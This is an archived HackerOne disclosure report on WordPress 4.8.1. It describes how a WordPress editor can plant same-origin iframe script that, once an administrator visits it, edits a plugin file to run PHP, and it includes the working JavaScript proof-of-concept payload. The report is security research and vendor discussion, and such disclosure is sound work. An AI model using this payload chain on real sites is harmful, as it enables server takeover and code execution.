---
tags:
  - type/disclosure
  - platform/hackerone
  - severity/high
  - env/web
  - stack/wordpress
  - vuln/xss
  - impact/rce
  - trigger/victim-interaction
  - trigger/social-engineering
substate: "informative"
weakness: null
enriched: true
body: true
date: 2017-10-04
submitted: 2017-08-27T01:55:26.996Z
bounty_usd: null
votes: 4
cve: []
program: "[[programs/wordpress|WordPress]]"
reporter: "skansing"
source: "https://hackerone.com/reports/263718"
title: "Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general"
---
# Wordpress 4.8.1 - Rogue editor leads to RCE. And the risks of same origin frame scripting in general

> **Severity:** High | **Bounty:** undisclosed | **Votes:** 4 | **Program:** WordPress | **Disclosed:** 2017-10-04

- Report: [https://hackerone.com/reports/263718](https://hackerone.com/reports/263718)
- CWE: N/A
- Submitted: 2017-08-27T01:55:26.996Z

## Report body

Public report body - fetched from `https://hackerone.com/reports/<id>.json` (the site's own disclosed-report data route).

#Background
This report is mainly about how a user with the role of editor, expectedly can post unfiltered content
but unexpectedly can pwn an administrator with a RCE chain due to same origin frame scripting.

Secondarily the report wants to highlight the technique used and the severity of it.

#Description
During my research I found that a XSS can, in the majority of cases, trivially be turned
into a RCE, by abusing same origin frame scripting in the XSS payload.

I demonstrated this "technique" in #263058 and #263109 (no need to read, there a POC in this report).
It can be used to do *almost* any action from the victims perspective, like adding an administrator or editing a plugin file.
This adds to the severity of XSS in core wp, themes and especially plugins.

It affect the understanding of the user role 'editor' and the ability to post unfiltered content
https://make.wordpress.org/core/handbook/testing/reporting-security-vulnerabilities/#why-are-some-users-allowed-to-post-unfiltered-html

An editor is a copy-paste and a administrator visit from RCE or performing any action.
Editors users / accounts them self are more attractive for cracking and social engineering.
Administrators are not aware of the risk associated with giving a user editor role or being a editor.
All future reports with XSS can be escalated to RCE resulting in increased severity.


# POC
This POC explores a rogue editor planting payload to RCE.

- Login as editor
- Upload a .html or plant the POC payload in content
- Login as administrator visit a link containing the payload

# POC Payload
The payload opens the plugin editor, edits a file and redirects to the edited file afterwards

```
<iframe src="http://127.0.0.1:8090/wp-admin/plugin-editor.php?file=hello.php" style="opacity:0">
</iframe>
<script>
setTimeout(function() {
  var p = "<?php phpinfo();"
  // full read/write control over dom, do anything(!)
  var d = document.querySelector("iframe").contentWindow.document;
  var c = d.querySelector("#newcontent")
  var s = d.querySelector("#submit")
  c.value = p
  s.click();
}, 2000);
setTimeout(function() {
  window.location.href = "http://127.0.0.1:8090/wp-content/plugins/hello.php"
}, 4000);
</script>
```

# Suggested Fix
the role editor should loose all privileges that can lead to scripting

consideration on hardening could be doing a BC break and switching to `x-frame-options: deny`.
However that can by bypassed by using `window.open(...)` instead of an iframe, but requires
the victim to click on the page after opening it. so this will only harden a bit.

another hardening option could be requiring password on critical actions such as
plugin install, file edit, etc. it will however have an impact on accessibility and
it might take time to find all the loop holes.

## Timeline

- **Report Filed**
- **Report Title Updated**
- **Report Informative**
- **2017-09-06** @skansing: Hi @johnbillion ,

Thanks for reviewing this bug. I knew at the time of the writting that this was a known feature (unfilted_html) that you also get a lot of noise in on, dublicates etc, but thought a *clear RCE chain* would help asses this at a proper severity. 

The two links provided does not really have a proper security angle on it and hence are really useless to educate or handle the problem at hand.

Also my point on "X-Frame-Option" was not a suggestion to implement it, it was to point out that It would not migrate the problem completely as the attacker can do cross frame scripting from tab to tab via window.open.

It is nowhere known for consumers of WP that adding a editor is a open portal to RCE and *the dangers are down played* in the docs such as https://codex.wordpress.org/Hardening_WordPress , concepts such as "Least Privilege Principle" and "Defense in Depth" falls apart in light of such vector. I also read (cant find it know) a area that leaves the user the impression that the XSS from a editor cant do any really damage (which is ofc wrong (= )

When unfiltered html means RCE in 6 lines of JS then this is something consumers should be aware of and which  wp shouldnt neglect/accept in a time where a WP RCE pays 50.000 $ at zerodium. 



Let make this public, this way consumers have reference that role editor or anything that gives unfiltered_html is stone throw away from a RCE. This would also give new bug hunters the possibility to escalate to RCE on any XSS. 

So any XSS bug would be same bounty/severity as https://hackerone.com/reports/149589 I would presume, as the entry level is easier but the severity is harder.
- **Agreed On Going Public**
- **2017-09-06** @skansing: ```
If you are running security tests against WordPress, use a lesser privileged user so that all content is filtered. If you
 are concerned about an Administrator putting XSS into content and stealing cookies, note that all cookies are
 marked for HTTP only delivery, and are divided into privileged cookies used for admin pages, and unprivileged
 cookies used for public facing pages. Content is never displayed unfiltered within the admin dashboard. Regardless,
 an Administrator has wide-ranging super powers, among which unfiltered HTML is a lesser one.
```

Notice how this text misinforms the dangers of unfiltered html and XSS in general.  And we are really concerned with the *editor*, not a administrator. With the POC chain explained, the attacker can do anything in lieu of the victim, there is no need for the attacker to get their cookies or etc, they can perform an attack as the payload trigger that bypass any need for stealing cookies/sessions.
- **2017-09-06** @skansing: An example of a report which was deemed low severity but could have lead to a RCE (https://hackerone.com/reports/253313) could easily have been escalated to RCE as the XSS has a lot higher impact than described. From the docs and reports (severity given / impact given in bounties) I would say most are not aware of this.
- **Agreed On Going Public**
- **Report Became Public**
